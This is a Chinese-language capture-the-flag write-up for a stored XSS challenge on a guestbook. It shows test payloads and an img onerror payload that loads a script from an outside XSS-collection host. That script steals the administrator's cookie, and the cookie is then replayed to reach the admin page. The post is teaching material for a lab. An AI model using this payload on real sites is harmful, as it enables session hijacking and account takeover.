**前言：啊啊啊啊！我蚌埠住了，在网上找的wp就一个两个的，跟着做，作为一个pwn手web萌新理解起来十分不友好，还没通，非常生气，学了一会，自己做通了。于是开始打算自己写个wp给后人，让后面的萌新能够理解的更透彻，少走我的弯路淦。**

咱就是从这个题目入手吧，打开之后是这个界面
![在这里插入图片描述](https://img-blog.csdnimg.cn/6688796b036d4cea8fbcb2d4bf859573.png)
根据题目提示，有[xss](https://so.csdn.net/so/search?q=xss&spm=1001.2101.3001.7020)注入相关内容，查看登录，发现走不通，于是从这个吐槽入手。
输入

```html
<script>alert(1)</script>
1
```

测试一下
![在这里插入图片描述](https://img-blog.csdnimg.cn/0adbf5ae531841d7b6cde48515f477ca.png)
发现没有文字，是不正常的现象。但是也没弹窗，说明存在漏洞，但是可能script被屏蔽了
输入

```html
<img src="#">
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/ea7bcd6bf5f1485ea4f09b570490fb35.png)

发现有个图片标志，说明存在漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/bd45009b63da45a7a79047105bae8596.png)

则判断存在注入点，XSS注入攻击是一个很大的类，这里我仅从这题出手，这题目是存储型XSS，相关知识自行搜索。[参考](https://blog.csdn.net/L2329794714/article/details/123709249)
具体原理就是相当于我们将我们的[木马](https://so.csdn.net/so/search?q=木马&spm=1001.2101.3001.7020)放到这个网站上了，当别人访问这个网站，我们的木马就会窃取他的cookie等相关信息。这里就是偷取了管理员的cookie

具体操作就是
**先通过吐槽框将我们的payload 提交到服务端，服务端会将这个数据保存并显示在留言板上，只要有人访问这个留言板，就会触发我们的代码。**

**我们的payload 通过在标签中（例如head，body）添加我们自己的XSS平台的javascript源，即每当有人访问留言板就会触发我们的payload 并且会引入我们的JS文件。**

这里就提到一个重点了，自己的XSS平台，这个东西兄弟们可以理解为一个远程木马服务器，如果有访问，我们的服务器上就会获取他的信息。

那么我们应该如何搭建自己的"木马服务器"呢，这里其实网上都有教程，不过需要内网穿透，而我们老白嫖怪了，网上有个免费的在线xss测试平台，这里把链接放出来[XSS平台](https://xss.yt/)
大家自行注册，登录进去后，大家先创一个项目
![在这里插入图片描述](https://img-blog.csdnimg.cn/b98e1d3fc56849a3b6f445217f5223f5.png)
项目中勾取这个代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/2d4d0b70a2664bf88edf3b5d48eeeb52.png)

点击查看代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/b013f59daf24401f935aa2f8aff47b25.png)
如果你读过别人的wp你会发现有个东西很像别人的代码，就是这里
![在这里插入图片描述](https://img-blog.csdnimg.cn/ce28d03b3b984a258edaccad1c9e785e.png)

```html
<img src=x οnerrοr=s=createElement('script');body.appendChild(s);s.src='//xss.yt/SFTX';>
1
```

代码具体意思就是
**它使用>标签的onerror事件来执行一个JavaScript代码块。当图片加载失败时，onerror事件将被触发，从而执行该代码块。该代码块创建了一个script元素，并将其src属性设置为//xss.yt/SFTX。然后，它将该元素添加到文档的头部。这意味着，当页面加载时，该脚本将被下载并执行，从而允许攻击者注入恶意代码并执行任意操作。**
我们复制此代码提交
![在这里插入图片描述](https://img-blog.csdnimg.cn/0a9f47f4ccaf4abb8b7ac7eabfdae731.png)
再访问
![在这里插入图片描述](https://img-blog.csdnimg.cn/79b3c9dc26904a52a80bae56a3bb416f.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/42a15f18030340b8a376c2319662d575.png)
我们发现
![在这里插入图片描述](https://img-blog.csdnimg.cn/3aebffa0430c498ba0c46bd0fb8048bd.png)
已经成功植入代码
回到项目内容查看
![在这里插入图片描述](https://img-blog.csdnimg.cn/517f0a67850d4503b016fca44bdc44ca.png)
发现2个头
![在这里插入图片描述](https://img-blog.csdnimg.cn/f394cf946f8f43a28f16ead7848035bf.png)
在第二个头中我们发现了admin的cookie以及url
![在这里插入图片描述](https://img-blog.csdnimg.cn/c14dd2480e1b4094b696c9901ef41f46.png)

于是我们构造包，访问http://c1ca7eb7-d615-4731-893e-33ae9f28ce2a.node4.buuoj.cn:81/backend/admin.php
ps：可以类比推理出这个文件位置
如果cookie不对，它会显示这个
![在这里插入图片描述](https://img-blog.csdnimg.cn/7a0973231ccb440d922b84f59804a790.png)
把cookie改掉为admin的
![在这里插入图片描述](https://img-blog.csdnimg.cn/a1e551f1573c43808b5d8ef27a588679.png)

获取flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/2169f80ef8294e61890ed38fabada2b2.png)

[XSS 绕过思路 bypass 之日天日地日空气_xss语句bypass-CSDN博客](https://blog.csdn.net/qq_39997096/article/details/109270493?ops_request_misc=&request_id=&biz_id=102&utm_term=XSS / bypass&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-109270493.142^v99^pc_search_result_base1&spm=1018.2226.3001.4187)